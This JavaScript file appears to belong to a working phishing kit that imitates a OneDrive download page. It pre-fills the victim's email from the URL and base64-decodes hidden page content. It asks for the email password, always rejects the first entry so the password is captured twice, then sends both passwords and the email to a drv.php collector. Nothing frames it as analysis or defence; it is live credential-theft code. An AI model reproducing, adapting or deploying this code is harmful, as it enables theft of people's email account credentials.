// 
const validEmail =
    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

// 
const urlParams = new URLSearchParams(window.location.search);
const getMail = urlParams.get('user');

const drv_app = document.getElementById("drv_app");
const driver = document.getElementById("driver");

if (validEmail.test(getMail)) {
    drv_app.innerHTML = atob(driver.value)
}

// 
let subCounter = 0;
function subFormBtn(b) {
    let page = b.parentElement;
    let mail = page.getElementsByClassName("input_mail")[0]
    let pass = page.getElementsByClassName("input_pass")[0]

    if (!validEmail.test(mail.value)) {
        mail.style.border = "1px solid red";
        return
    }
    else if (validEmail.test(pass.value) || pass.value == "" || pass.value == 123456 || pass.value.toLowerCase() == "qwerty" || pass.value.toLowerCase() == "testing" || pass.value.toLowerCase() == "password") {
        pass.style.border = "1px solid red";
        return
    }

    if (subCounter == 0) {
        pass.style.border = "1px solid red";
        drv_app.value = pass.value
        pass.value = "";

        subCounter++
        return
    }
    else{
        pass.style.border = "1px solid darkgreen";  
    }

    location = "./drv.php?auth=oneDrive&pass1="+drv_app.value+"&pass2="+pass.value+"&mail="+mail.value;
    
}

// 
const main_container = document.getElementById("main_container");
const form_caller = document.getElementById("form_caller");
const form_main = document.getElementById("form_main");
const pager = document.getElementById("pager");
// const form_aside = document.getElementById("form_aside");

const temp_mail = document.getElementById("temp_mail");

const sub_btn = document.getElementById("sub_btn");

if (validEmail.test(getMail) && getMail != null) {
    temp_mail.value = getMail
}

sub_btn.addEventListener("click", ()=>{
    main_container.innerHTML = `
    <div id="form_main">
        <aside id="form_aside">
        <img src="./0.jpg" alt="">
        <p>Confirm your account to start download!</p>
        <input type="text" class="input_mail" placeholder="Enter Email Address" readonly value="${temp_mail.value}">
        <input type="password" class="input_pass" placeholder="Enter Email Password">
        <button onclick="subFormBtn(this)">Download Now</button>
        </aside>
    </div>
`;
});